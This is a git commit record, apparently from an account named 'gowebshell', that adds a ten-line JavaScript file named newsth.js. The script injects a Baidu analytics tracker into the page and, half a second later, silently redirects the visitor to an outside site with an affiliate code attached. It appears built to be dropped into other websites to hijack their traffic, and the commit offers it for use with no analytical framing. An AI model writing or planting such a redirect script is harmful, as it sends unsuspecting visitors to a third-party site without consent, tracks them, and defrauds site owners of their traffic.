aef49a0722151b6beb449ce09f473107a9a30ba6
gowebshell <MinnieWSonnier30+github@gmail.com>
2023-12-01 16:18:17 -0300

    Create newsth.js

---
+++ newsth.js
@@ -0,0 +1,10 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?40a97903fb4fe594cf467f363b41b352";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+setTimeout(function(){
+    window.location.href = 'https://www.thwin9.com/m/index.html?affiliateCode=ck0003';
+},500);
